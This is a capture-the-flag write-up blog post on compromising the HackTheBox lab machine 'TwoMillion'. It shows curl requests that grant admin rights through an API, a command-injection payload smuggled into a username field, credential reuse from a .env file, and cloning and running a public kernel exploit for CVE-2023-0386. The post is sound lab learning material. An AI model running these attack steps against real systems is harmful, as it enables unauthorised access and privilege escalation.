---
title: Hacking "TwoMillion" on HTB
date: 2024-09-01 14:00:00 +05:30
modified: 2024-09-01 14:00:00 +05:30
tags: [hackthebox, hacking, cybersecurity]
description: This post contains the attack steps to hack into TwoMillion on Hack the Box
image: "/hacking-twomillion/twomillionhtb.jpg"
---

# Attacking "TwoMillion" on HackTheBox

<hr>

**TwoMillion** is a Linux system that was released to celebrate reaching 2 million users on HackTheBox. The machine features an old version of the HTB platform that includes a hackable invite code. By leveraging this, an account can be created on the platform, leading to API enumeration, privilege escalation, and ultimately gaining root access.

<hr>

## STEP 1: Reconnaissance

<hr>

Let's start by doing an <abbr title="Network Mapper">NMAP</abbr> scan to discover the available ports on the target machine.

```bash
nmap -sC -sV -v -oA twomillion_nmap {TARGET IP}
```

The scan reveals ports 22 (SSH) and 80 (Nginx) are open, with port 80 redirecting to `2million.htb`. Let's add this vHost to our `/etc/hosts` file.

```bash
echo '10.10.10.11 2million.htb' | sudo tee -a /etc/hosts
```

Upon accessing `2million.htb`, we see an old version of the HackTheBox website. The site allows users to join the platform through an invite code, which we can exploit.

<hr>

## STEP 2: Exploitation

<hr>

The first thing we need to do is inspect the invite code page. Viewing the page source reveals some interesting JavaScript that handles the invite code verification. Using deobfuscation techniques on the obfuscated JavaScript, we can generate and verify invite codes, allowing us to create an account on the platform.

Once logged in, we enumerate the available API endpoints and discover administrative functions, such as `/api/v1/admin/settings/update` and `/api/v1/admin/vpn/generate`. By manipulating these endpoints, we can elevate our privileges and eventually gain command execution through a command injection vulnerability in the VPN generation feature.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": 1}'
```

This gives us administrative access, and we can now proceed to inject a reverse shell payload to gain a foothold on the system.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
```

<hr>

## STEP 3: Lateral Movement

<hr>

With a shell on the system, we enumerate further and find a `.env` file containing database credentials. Using these credentials, we log in as the `admin` user via SSH.

```bash
ssh admin@2million.htb
```

The user flag can be found in `/home/admin`.

<hr>

## STEP 4: Privilege Escalation

<hr>

Enumeration of the system reveals an outdated kernel version (5.15.70), which is vulnerable to CVE-2023-0386. We exploit this vulnerability to escalate our privileges to root.

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r cve.zip CVE-2023-0386
scp cve.zip admin@2million.htb:/tmp
cd /tmp/CVE-2023-0386/
make all
./exp
```

Finally, we gain root access, and the root flag can be found in `/root/`.

<hr>

## STEP 5: Conclusion

With this attack, we have successfully pwned the "TwoMillion" machine on HackTheBox. The key takeaways include learning about JavaScript deobfuscation, API enumeration, command injection, and exploiting CVE-2023-0386 for privilege escalation.

Stay tuned for more posts about attacking different HackTheBox machines!

<hr>


